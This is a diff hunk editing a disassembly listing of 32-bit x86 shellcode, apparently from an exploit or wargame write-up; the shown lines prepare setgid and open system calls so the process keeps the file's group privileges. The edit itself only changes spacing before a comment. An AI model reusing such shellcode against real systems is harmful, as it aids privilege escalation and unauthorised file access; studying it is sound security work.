@@ -19,7 +19,7 @@
    0xbfffeee0:	mov    ebx,ecx
    0xbfffeee2:	push   0x46 ;preparing setgid syscall {setgid (%ebx)}
    0xbfffeee4:	pop    eax
-   0xbfffeee5:	int    0x80	;setgid to the process will run with group id of the file
+   0xbfffeee5:	int    0x80;setgid to the process will run with group id of the file
    0xbfffeee7:	push   0x5 ;preparing open syscall	{open (%ebx , %ecx , %edx )}
    0xbfffeee9:	pop    eax
    0xbfffeeea:	xor    ecx,ecx
